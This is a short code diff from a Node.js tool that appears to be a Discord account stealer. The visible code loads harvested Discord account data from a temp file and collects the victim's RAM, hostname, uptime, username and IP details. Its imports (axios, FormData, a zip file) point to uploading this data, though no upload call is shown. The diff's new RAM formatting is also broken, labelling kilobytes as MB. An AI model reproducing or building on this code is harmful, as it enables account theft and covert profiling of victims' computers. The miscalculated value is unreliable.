@@ -3,7 +3,6 @@ const { isValidURL } = require('../util/string');
 const axios = require('axios');
 const { join, sep } = require('path');
 const os = require('os');
-const { filesize } = require('filesize');
 const fs = require('fs');
 const { tempFolder } = require('../index');
 const FormData = require('form-data');
@@ -17,7 +16,7 @@ const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
   const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
   const computerInfoFields = [
-    ['RAM', filesize(Math.round(os.totalmem()))],
+    ['RAM', Math.round(os.totalmem() / 1000) + 'MB'],
     ['Name', os.hostname()],
     ['Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
     ['Username', os.userInfo().username],
